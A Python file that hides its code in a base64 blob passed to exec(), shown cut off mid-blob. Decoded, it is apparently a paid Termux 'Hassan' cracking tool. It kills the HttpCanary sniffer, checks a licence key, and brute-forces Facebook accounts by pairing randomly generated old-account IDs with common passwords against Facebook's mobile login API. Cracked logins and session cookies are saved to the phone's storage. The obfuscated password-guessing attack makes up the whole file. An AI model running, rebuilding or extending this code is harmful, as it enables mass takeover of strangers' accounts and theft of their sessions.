import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKaW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHB5Y3VybApmcm9tIGlvIGltcG9ydCBCeXRlc0lPCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBzb3AKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyByYWNlCmZyb20gc3RyaW5nIGltcG9ydCBkaWdpdHMsIGFzY2lpX2xldHRlcnMKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgYmFzZTY0CmltcG9ydCBjdHlwZXMKCnByaW50KCdceDFiWzE7OTFtW1x4MWJbMTs5N20tXHgxYlsxOzkxbV0gXHgxYlsxOzkybSBXRUxDT01FIFRPIEhBU1NBTiBUT09MJykKb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2NoYXQud2hhdHNhcHAuY29tL0prWFhEWml4WThPS0tkcm12QjYycms/bW9kZT1hY190JykKdGltZS5zbGVlcCgyKQoKZGVmIHJ1bl9zeXN0ZW1fY29tbWFuZChjb21tYW5kKToKICAgIG9zLnN5c3RlbShmJ3tjb21tYW5kfSA+L2Rldi9udWxsIDI+JjEnKQoKcnVuX3N5c3RlbV9jb21tYW5kKCdjaG1vZCA3MDAgL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9iaW4nKQpydW5fc3lzdGVtX2NvbW1hbmQoJ3BraWxsIC1mIGh0dGNhbmFyeScpCgpjbGFzcyBOZWJ1bGFDb2xvcnM6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5XID0gJ1x4MWJbOTc7MW0nCiAgICAgICAgc2VsZi5SID0gJ1x4MWJbOTE7MW0nCiAgICAgICAgc2VsZi5HID0gJ1x4MWJbOTI7MW0nCiAgICAgICAgc2VsZi5ZID0gJ1x4MWJbOTM7MW0nCiAgICAgICAgc2VsZi5CID0gJ1x4MWJbOTQ7MW0nCiAgICAgICAgc2VsZi5QID0gJ1x4MWJbOTU7MW0nCiAgICAgICAgc2VsZi5DID0gJ1x4MWJbOTY7MW0nCiAgICAgICAgc2VsZi5OID0gJ1x4MWJbMG0nCiMgT1dORVIgQlkgU0NSSVBUIDogTVIgT0dHWQojIEdJVEhVQiBMSU5LIDogU0tCRVItQ1lCRVIKIyBNQUNLIEJZIDogTVVIQU1NQUQgSkFLQVJJWUEgSEFTQU4KaW1wb3J0IG9zLCB1dWlkLCBiYXNlNjQsIHJlcXVlc3RzLCB6bGliLCB0aW1lLCBzdWJwcm9jZXNzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCklEX0ZJTEUgPSAnL2NobW9kIDcwMC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvYmluLy5vZ2d5LWxvY2snCmRlZiBtZXlleHVkaSgpOgogIG9zLnN5c3RlbSgnY2xlYXInKSAKICB1dWlkID0gIm1yIitzdHIob3MuZ2V0dWlkKCkpKyJIQVNTQU4iK3N0cihvcy5nZXR1aWQoKSkrIlBBSUQuVE9PTCIKICBpZCA9ICcnLmpvaW4odXVpZCkKICB0cnk6CiAgICBodHRwQ2FodCA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vZ2l0aHViLmNvbS9IQVNTQU4tSEFZQVQwMDcvQ1lCRVI5MC9ibG9iL21haW4vQXBwcm92ZWwudHh0IikudGV4dAogICAgaWYgaWQgaW4gaHR0cENhaHQ6CiAgICAgIG1zZyA9IHN0cihvcy5nZXRldWlkKCkpCiAgICAgIHByaW50KCkKICAgICAgcGFzcwogICAgZWxzZToKICAgICAgcHJpbnQoJyBceDFiWzE7MzJt4pWt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWuJykKICAgICAgcHJpbnQoZicgXHgxYlsxOzMybeKVkVvwnZ+3XUtleToge2lkfScpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVkVvigKJdIEZVTEwgSEFWWSBMT0dJTiBXQVJSQU5UWScpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVkVvigKJdIE9OTFkgQUNUSVZFIElEIENMT05FIDEwMCUnKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSBJRCBXSUxMIEJFIExPR0lOIDgwJScpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVkVvigKJdIFdJLUZJICBBTkQgREFUQSBCT1RIIFdPUktJTkcgMTAwJScpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVkVvigKJdICA3IERBWSAyMDAgUlMgJykKICAgICAgcHJpbnQoJyBceDFiWzE7MzJt4pWRW+KAol0gMTUgREFZIDQwMCBScyAnKQogICAgICBwcmludCgnIFx4MWJbMTszMm3ilZFb4oCiXSAzMCBEQVkgODAwIFJzICcpCiAgICAgIHByaW50KGYnIFx4MWJbMTszMm3ilZFbS0VZXToge2lkfScpCiAgICAgIHByaW50KCcgXHgxYlsxOzMybeKVsOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVrycpCiAgICAgIHVuYW1lID1pbnB1dCgnXDAzM1sxOzk3bVtcMDMzWzE7OTJt4oCiXDAzM1sxOzk3bV1cMDMzWzE7OTJtIFdIQVQgSVMgWU9VUiBOQU1FIFwwMzNbMTs5MW06IFwzM1sxOzMybScpCiAgICAgIGlucHV0KCcgXDAzM1sxOzMwbeKVmuKVkOKVkFvigKJdIElGIFUgV0FOVCBBUFBST1ZBTCBUSEVOIFBSRVNTIEVOVEVSICcpCiAgICAgIHRrcyA9ICgnSGVsbG8lMjBTaXIlMjAhJTIwUGxlYXNlJTIwQXBwcm92ZSUyME15JTIwVG9rZW4lMjBUaGUlMjBUb2tlbiUyMElzJTIwOiUyMCcraWQpO29zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rOTIzMDgyMDE5MTUwP3RleHQ9Jyt0a3MpLGFwcHJvdmFsKCkgICAgICAgCiAgZXhjZXB0OgogICAgc3lzLmV4aXQoKQptZXlleHVkaSgpCgogICAgICAKZGVmIHByb19iYW5uZXIoKToKICAgIHJldHVybiAiIiIKXHgxYlsxOzk2bQrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRXDMzWzA7NDFtICAgICAgICAgIFsg8J2Qh/CdkIDwnZCS8J2QkvCdkIDwnZCNIPCdkJPwnZCR8J2QiPCdkILwnZCK8J2QhPCdkJEgXSAgICAgICAgICAgXDAzM1swOzkybeKVkQrilZEg4paR4paI4paI4paIICAgICDilpHilojilojilogg4paR4paI4paIICAgICDilpHilojilogg4paR4paI4paI4paI4paI4paI4paI4paIICAgIOKVkQrilZEg4paR4paI4paI4paI4paIICAg4paR4paI4paI4paI4paIIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKVkQrilZEg4paR4paI4paI4paR4paI4paIIOKWkeKWiOKWiOKWkeKWiOKWiCDilpHilojiloggICAgIOKWkeKWiOKWiCDilpHilojiloggICAg4paR4paI4paIICDilZEK4pWRIOKWkeKWiOKWiCDilpHilojilojilojilogg4paR4paI4paIIOKWkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilpHilojiloggICAg4paR4paI4paIICDilZEK4pWRIOKWkeKWiOKWiCAg4paR4paI4paIICDilpHilojilogg4paR4paI4paIICAgICDilpHilojilogg4paR4paI4paIICAgIOKWkeKWiOKWiCAg4pWRCuKVkSDilpHilojiloggICAgICAg4paR4paI4paIIOKWkeKWiOKWiCAgICAg4paR4paI4paIIOKWkeKWiOKWiCAgIOKWkeKWiOKWiCAgIOKVkQrilZEg4paR4paI4paIICAgICAgIOKWkeKWiOKWiCDilpHilojiloggICAgIOKWkeKWiOKWiCDilpHilojilojilojilojilojilojiloggICAg4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQpceDFiWzE7OTZtIOKepOKVkSBceDFiWzE7OTdtQ3JlYXRvciDilZEgSEFTU0FOClx4MWJbMTs5Nm0g4p6k4pWRIFx4MWJbMTs5N21WZXJzaW9uIOKVkSAyLjUKXHgxYlsxOzk2bSDinqTilZEgXHgxYlsxOzk3bVN0YXR1cyAg4pWRIFByZW1pdW0gVG9vbApceDFiWzE7OTZtIOKepOKVkSBceDFiWzE7OTdtVG9vbCAgICDilZEgSGFzc2FuLVRyaWNrZXIgUGFpZCBUb29sClx4MWJbMTs5Mm3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiIiIKCmRlZiBsaW5leCgpOgogICAgY29sb3IgPSBOZWJ1bGFDb2xvcnMoKQogICAgcHJpbnQoZiJ7Y29sb3IuUH3ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQoKZGVmIGNsZWFyKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KHByb19iYW5uZXIoKSkKCmRlZiBzZWN1cmVfeG9yKGRhdGEsIGtleT04NSk6CiAgICByZXR1cm4gYnl0ZXMoW2IgXiBrZXkgZm9yIGIgaW4gZGF0YV0pCgpkZWYgZ2V0X2hpZGRlbl91cmwoKToKICAgIHBhcnRzID0gWwogICAgICAgIHNlY3VyZV94b3IoYidodHRwczovLycpLAogICAgICAgIHNlY3VyZV94b3IoYidnaXRodWIuY29tLycpLAogICAgICAgIHNlY3VyZV94b3IoYicxLU5BTExBLycpLAogICAgICAgIHNlY3VyZV94b3IoYidKaW5uX0FwcC8nKSwKICAgICAgICBzZWN1cmVfeG9yKGInYmxvYi9tYWluLycpLAogICAgICAgIHNlY3VyZV94b3IoYidBcHAudHh0JykKICAgIF0KICAgIHJldHVybiBiIiIuam9pbihzZWN1cmVfeG9yKHBhcnQpIGZvciBwYXJ0IGluIHBhcnRzKS5kZWNvZGUoKQoKY2xhc3MgVXNlckFnZW50R2VuZXJhdG9yOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuY3VzdG9tX3VzZXJfYWdlbnRzID0gWwogICAgICAgICAgICAiW0ZCQU4vRkI0QTtGQkFWLzQzMC4xLjAuNS4xMDk7RkJCVi80NjMyMjA2OTI7RkJETS97ZGVuc2l0eT0yLjAsd2lkdGg9NzIwLGhlaWdodD0xNjAwfTtGQkxDL2VuX1VTO0ZCUlYvVmVyaXpvbjtGQk1GL1NhbXN1bmc7RkJCRC9TYW1zdW5nO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL1NNLUEwNDdGO0ZCU1YvMTI7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhO10iLAogICAgICAgIF0KCiAgICBkZWYgX2dlbmVyYXRlX21vemlsbGFfdXNlcl9hZ2VudChzZWxmKToKICAgICAgICBhbmRyb2lkX3ZlcnNpb24gPSByYW5kb20ucmFuZGludCg0LCAxMykKICAgICAgICBkZXZpY2UgPSByYW5kb20uY2hvaWNlKCgnU00tRzkwMEYnLCAnU00tRzkyMEYnLCAnU00tVDUzNScsICdTTS1UMjMxJywgJ1NNLUozMjBGJywgJ0dULUk5MTkwJykpCiAgICAgICAgcmVzb2x1dGlvbiA9IHJhbmRvbS5jaG9pY2UoKCd7ZGVuc2l0eT0xLjUsd2lkdGg9NzIwLGhlaWdodD0xMjgwfScsICd7ZGVuc2l0eT0zLjUsd2lkdGg9MTQ0MCxoZWlnaHQ9MzA0MH0nKSkKICAgICAgICBjaHJvbWVfdmVyc2lvbiA9IGYie3JhbmRvbS5yYW5kaW50KDEwMCwgMTUwKX0uMC4wLjAiCiAgICAgICAgcmV0dXJuIGYiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthbmRyb2lkX3ZlcnNpb259OyB7ZGV2aWNlfSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lL3tjaHJvbWVfdmVyc2lvbn0gTW9iaWxlIFNhZmFyaS81MzcuMzYgW3tyZXNvbHV0aW9ufV0iCgogICAgZGVmIGdlbmVyYXRlX3VzZXJfYWdlbnQoc2VsZik6CiAgICAgICAgdXNlcl9hZ2VudF90eXBlID0gcmFuZG9tLmNob2ljZSgoJ01vemlsbGEnLCAnRmFjZWJvb2snLCAnRGFsdmlrJywgJ2lQaG9uZScsICdDdXN0b20nKSkKICAgICAgICBpZiB1c2VyX2FnZW50X3R5cGUgPT0gJ01vemlsbGEnOgogICAgICAgICAgICByZXR1cm4gc2VsZi5fZ2VuZXJhdGVfbW96aWxsYV91c2VyX2FnZW50KCkKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4gcmFuZG9tLmNob2ljZShzZWxmLmN1c3RvbV91c2VyX2FnZW50cykKCiAgICBkZWYgbG9hZF91c2VyX2FnZW50c19mcm9tX3VybChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGltcG9ydCByZXF1ZXN0cwogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RydC1GaXJlL2RhdGEvbWFpbi91YS50eHQnKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dC5zcGxpdGxpbmVzKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gW10KCmNsYXNzIEhBU1NBTkNyYWNrZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5va3MgPSBbXQogICAgICAgIHNlbGYuY3BzID0gW10KICAgICAgICBzZWxmLmxvb3AgPSAwCiAgICAgICAgc2VsZi5jb2xvciA9IE5lYnVsYUNvbG9ycygpCiAgICAgICAgc2VsZi51c2VyX2FnZW50cyA9IFVzZXJBZ2VudEdlbmVyYXRvcigpLmxvYWRfdXNlcl9hZ2VudHNfZnJvbV91cmwoKQoKICAgIGRlZiBvbGRfbWVudShzZWxmKToKICAgICAgICBjbGVhcigpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5jb2xvci5QfSB7c2VsZi5jb2xvci5DfVsxXSB7c2VsZi5jb2xvci5HfUNSQUNLIDIwMDkgQUNDT1VOVFMgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB9IikKICAgICAgICBwcmludChmIntzZWxmLmNvbG9yLlB9IHtzZWxmLmNvbG9yLkN9WzJdIHtzZWxmLmNvbG9yLkd9Q1JBQ0sgMjAwOS0yMDEzIEFDQ09VTlRTICAgICAgICAgICAge3NlbGYuY29sb3IuUH0iKQogICAgICAgIHByaW50KGYie3NlbGYuY29sb3IuUH0ge3NlbGYuY29sb3IuQ31bMF0ge3NlbGYuY29sb3IuUn3ih6YgQkFDSyBUTyBNQUlOIE1FTlUgICAgICAgICAgICAgICAgIHtzZWxmLmNvbG9yLlB9IikKICAgICAgICBwcmludChmJ3tzZWxmLmNvbG9yLlB94pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQJykKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICAKICAgICAgICBpZiBjaG9pY2UgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goJzEwMDAwMCcpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgZWxpZiBjaG9pY2UgaW4gKCcwJywgJzAwJyk6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiXG4gIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgY2hvaWNlISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCgogICAgZGVmIHF1YW50dW1fYnJlYWNoX21lbnUoc2VsZik6CiAgICAgICAgY2xlYXIoKQogICAgICAgIHNlcmllc19tYXAgPSB7CiAgICAgICAgICAgICcxJzogJzEwMDAwMCcsICcyJzogJzEwMDAwMScsICczJzogJzEwMDAwMicsIAogICAgICAgICAgICAnNCc6ICcxMDAwMDMnLCAnNSc6ICcxMDAwMDQnCiAgICAgICAgfQogICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5XfVx4MWJbMTs5Nm0g4p6kIFNlbGVjdCBTZXJpZXM6IikKICAgICAgICBmb3IgbnVtLCBwcmVmaXggaW4gc2VyaWVzX21hcC5pdGVtcygpOgogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31be3NlbGYuY29sb3IuR317bnVtfXtzZWxmLmNvbG9yLld9XSB7c2VsZi5jb2xvci5DfXtwcmVmaXh9IikKICAgICAgICAKICAgICAgICBsaW5leCgpCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiIgIHtzZWxmLmNvbG9yLkN9XHgxYlsxOzk2bSDinqQgQ2hvb3NlOiB7c2VsZi5jb2xvci5XfSIpLnN0cmlwKCkKICAgICAgICBzZWxlY3RlZF9wcmVmaXggPSBzZXJpZXNfbWFwLmdldChjaG9pY2UpCgogICAgICAgIGlmIG5vdCBzZWxlY3RlZF9wcmVmaXg6CiAgICAgICAgICAgIHByaW50KGYiICB7c2VsZi5jb2xvci5SfeKaoCBJbnZhbGlkIFNlcmllcyEiKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgIHNlbGYucXVhbnR1bV9icmVhY2hfbWVudSgpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHNlbGYuZXhlY3V0ZV9icmVhY2goc2VsZWN0ZWRfcHJlZml4KQoKICAgIGRlZiBleGVjdXRlX2JyZWFjaChzZWxmLCBwcmVmaXgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBsaW1pdCA9IGludChpbnB1dChmIiAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtIOKepCBFbnRlciBMaW1pdDoge3NlbGYuY29sb3IuV30iKSkKICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLlJ94pqgIEludmFsaWQgTnVtYmVyISIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgc2VsZi5vbGRfbWVudSgpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB0YXJnZXRzID0gW3ByZWZpeCArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoZGlnaXRzLCBrPTkpKSBmb3IgXyBpbiByYW5nZShsaW1pdCldCiAgICAgICAgcGFzc2xpc3QgPSBbJzEyMzQ1Njc4OScsICcxMjM0NTYnLCAnMTIzNDU2NzgnLCAnMTIzNDU2NycsICcxMjM0NTY3ODkwJ10KCiAgICAgICAgd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBleGVjdXRvcjoKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31ceDFiWzE7OTZtIFVTSU5HIFNFUklFUzoge3NlbGYuY29sb3IuWX17cHJlZml4fSAiKQogICAgICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31ceDFiWzE7OTZtIFRPVEFMIEFDQ09VTlQ6IHtzZWxmLmNvbG9yLkd9e2xlbih0YXJnZXRzKX0iKQogICAgICAgICAgICBsaW5leCgpCiAgICAgICAgICAgIGZvciB0YXJnZXQgaW4gdGFyZ2V0czoKICAgICAgICAgICAgICAgIGV4ZWN1dG9yLnN1Ym1pdChzZWxmLmJyZWFjaF90YXJnZXQsIHRhcmdldCwgcGFzc2xpc3QpCiAgICAgICAgCiAgICAgICAgc2VsZi5kaXNwbGF5X3Jlc3VsdHMoKQoKICAgIGRlZiBicmVhY2hfdGFyZ2V0KHNlbGYsIHRhcmdldCwgcGFzc2xpc3QpOgogICAgICAgIHNlbGYubG9vcCArPSAxCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyICB7c2VsZi5jb2xvci5XfVtIQVNTQU5dIHtzZWxmLmxvb3B9fHtzZWxmLmNvbG9yLlJ9e2xlbihzZWxmLm9rcyl9fHtzZWxmLmNvbG9yLkd9e2xlbihzZWxmLmNwcyl9e3NlbGYuY29sb3IuV30nKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGZvciBwYXNzd29yZCBpbiBwYXNzbGlzdDoKICAgICAgICAgICAgaWYgc2VsZi50cnlfYnJlYWNoKHRhcmdldCwgcGFzc3dvcmQpOgogICAgICAgICAgICAgICAgYnJlYWsKCiAgICBkZWYgdHJ5X2JyZWFjaChzZWxmLCB1aWQsIHBhc3N3b3JkKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShzZWxmLnVzZXJfYWdlbnRzKQogICAgICAgICAgICAKICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogdWEsCiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICAgICAnSG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAgICAgJ0F1dGhvcml6YXRpb24nOiAnT0F1dGggMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzRGlvcjIzNDM3YTRhMzInLAogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBwYXlsb2FkID0gewogICAgICAgICAgICAgICAgJ2FkaWQnOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAgICAgICAgICdmb3JtYXQnOiAnanNvbicsCiAgICAgICAgICAgICAgICAnZGV2aWNlX2lkJzogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAnZW1haWwnOiB1aWQsCiAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwKICAgICAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywKICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsCiAgICAgICAgICAgICAgICAnbWV0aG9kJzogJ2F1dGgubG9naW4nLAogICAgICAgICAgICB9CgogICAgICAgICAgICBlbmNvZGVkX3BheWxvYWQgPSB1cmxsaWIucGFyc2UudXJsZW5jb2RlKHBheWxvYWQpCiAgICAgICAgICAgIGJ1ZmZlciA9IEJ5dGVzSU8oKQogICAgICAgICAgICBjID0gcHljdXJsLkN1cmwoKQogICAgICAgICAgICBjLnNldG9wdChjLlVSTCwgJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL2F1dGgvbG9naW4nKQogICAgICAgICAgICBjLnNldG9wdChjLlBPU1QsIDEpCiAgICAgICAgICAgIGMuc2V0b3B0KGMuUE9TVEZJRUxEUywgZW5jb2RlZF9wYXlsb2FkKQogICAgICAgICAgICBjLnNldG9wdChjLldSSVRFREFUQSwgYnVmZmVyKQogICAgICAgICAgICBjLnNldG9wdChjLlRJTUVPVVQsIDEwKQogICAgICAgICAgICAKICAgICAgICAgICAgaGVhZGVyX2xpc3QgPSBbZiJ7a2V5fToge3ZhbHVlfSIgZm9yIGtleSwgdmFsdWUgaW4gaGVhZGVycy5pdGVtcygpXQogICAgICAgICAgICBjLnNldG9wdChjLkhUVFBIRUFERVIsIGhlYWRlcl9saXN0KQogICAgICAgICAgICAKICAgICAgICAgICAgYy5wZXJmb3JtKCkKICAgICAgICAgICAgcmVzcG9uc2VfYm9keSA9IGJ1ZmZlci5nZXR2YWx1ZSgpLmRlY29kZSgndXRmLTgnKQogICAgICAgICAgICByZXNwb25zZSA9IGpzb24ubG9hZHMocmVzcG9uc2VfYm9keSkKICAgICAgICAgICAgYy5jbG9zZSgpCiAgICAgICAgICAgIGJ1ZmZlci5jbG9zZSgpCgogICAgICAgICAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHJlc3BvbnNlOgogICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfc3VjY2Vzcyh1aWQsIHBhc3N3b3JkLCByZXNwb25zZSkKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlc3BvbnNlLmdldCgnZXJyb3InLCB7fSkuZ2V0KCdtZXNzYWdlJywgJycpOgogICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfcGFydGlhbCh1aWQsIHBhc3N3b3JkKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgaGFuZGxlX3N1Y2Nlc3Moc2VsZiwgdWlkLCBwYXNzd29yZCwgcmVzcG9uc2UpOgogICAgICAgIGNva2kgPSAnOycuam9pbihbZiJ7Y1snbmFtZSddfT17Y1sndmFsdWUnXX0iIGZvciBjIGluIHJlc3BvbnNlLmdldCgnc2Vzc2lvbl9jb29raWVzJywgW10pXSkKICAgICAgICBwcmludChmIlxyICB7c2VsZi5jb2xvci5HfVx4MWJbMTs5Nm0gICDinqQgU1VDQ0VTUyB7c2VsZi5jb2xvci5XfXt1aWR9fHtzZWxmLmNvbG9yLkd9e3Bhc3N3b3JkfXtzZWxmLmNvbG9yLld9IikKICAgICAgICB3aXRoIG9wZW4oJy9zZGNhcmQvSEFTU0FOLU9MRC50eHQnLCAnYScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZid7dWlkfXx7cGFzc3dvcmR9fHtjb2tpfVxuJykKICAgICAgICBzZWxmLm9rcy5hcHBlbmQodWlkKQoKICAgIGRlZiBoYW5kbGVfcGFydGlhbChzZWxmLCB1aWQsIHBhc3N3b3JkKToKICAgICAgICBwcmludChmIlxyICB7c2VsZi5jb2xvci5ZfVx4MWJbMTs5MG0gICBbTUhEXSB7c2VsZi5jb2xvci5HfXt1aWR9e3NlbGYuY29sb3IuWX3igKJceDFiWzE7OTFte3Bhc3N3b3JkfXtzZWxmLmNvbG9yLld9IikKICAgICAgICB3aXRoIG9wZW4oJy9zZGNhcmQvSEFTU0FOLU9MRC50eHQnLCAnYScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZid7dWlkfXx7cGFzc3dvcmR9XG4nKQogICAgICAgIHNlbGYuY3BzLmFwcGVuZCh1aWQpCiAgICAgICAgCiAgICBkZWYgZGlzcGxheV9yZXN1bHRzKHNlbGYpOgogICAgICAgIGNsZWFyKCkKICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuR31ceDFiWzE7OTZtICAg4p6kIENSQUNLSU5HIENPTVBMRVRFIikKICAgICAgICBsaW5leCgpCiAgICAgICAgcHJpbnQoZiIgIHtzZWxmLmNvbG9yLld9Q1A6IHtzZWxmLmNvbG9yLll9e2xlbihzZWxmLm9rcyl9IikKICAgICAgICBwcmludChmIiAge3NlbGYuY29sb3IuV31PSzoge3NlbGYuY29sb3IuR317bGVuKHNlbGYuY3BzKX0iKQogICAgICAgIGxpbmV4KCkKICAgICAgICBpbnB1dChmIiAge3NlbGYuY29sb3IuQ31QcmVzcyBFTlRFUiB0byBjb250aW51ZSB7c2VsZi5jb2xv